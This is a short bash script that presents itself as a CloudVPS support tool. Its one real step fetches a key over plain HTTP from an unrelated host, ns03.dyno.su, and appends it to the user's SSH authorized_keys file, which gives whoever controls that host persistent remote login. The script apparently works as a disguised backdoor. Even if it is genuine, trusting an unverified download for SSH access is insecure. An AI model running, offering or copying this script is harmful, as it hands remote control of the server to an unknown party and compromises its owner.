#!/bin/bash
#
# Script by: Leon de Jong, CloudVPS
#
# This script downloads the key of CloudVPS to the server running this script to allow support access
#
# future functions: 
# - auto removal of said key to keep authorized_keys clean
# - adding of comment to authorized_keys to show last CloudVPS login date
# 

#variables, can change later. 

KEYLOCATION=http://ns03.dyno.su/key
SSHFOLDER=~/.ssh/
AUTHORIZEDKEYS=authorized_keys
#tag we put after the key
CLOUDVPSKEYNAME=CloudVPS-key

#function to check if key is allready there (i like functions)

function sshkeycheck()
{
if [[ $(grep $CLOUDVPSKEYNAME $SSHFOLDER/$AUTHORIZEDKEYS  ) = *CloudVPS-key ]]; then
	echo "Key allready exists"
	exit 0
fi 
}

sshkeycheck

if [ ! -d "$SSHFOLDER" ]; then
	mkdir $SSHFOLDER
fi

curl -L $KEYLOCATION >> $SSHFOLDER/$AUTHORIZEDKEYS